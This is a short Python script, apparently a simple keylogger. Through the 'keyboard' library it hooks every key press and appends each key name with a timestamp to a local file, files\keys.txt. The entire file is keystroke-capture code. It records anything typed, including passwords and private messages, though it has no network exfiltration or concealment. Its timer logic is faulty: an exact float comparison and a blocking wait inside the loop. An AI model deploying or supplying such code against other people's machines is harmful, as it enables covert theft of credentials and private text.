import keyboard, time

def key_press(e):
    with open('files\\keys.txt', "a") as file:
        file.write(f"{e.name} pressed at: {time.strftime('%m/%d %H:%M:%S')}\n")

if __name__ == "__main__":
    started = time.time()
    while True:
        current = time.time() - started
        if current == 60:
            with open('files\\keys.txt', "a") as file:
                file.write("\nSEC: 300\n")
        if current < 60:
            print(current)

        keyboard.on_press(key_press)
        keyboard.wait()
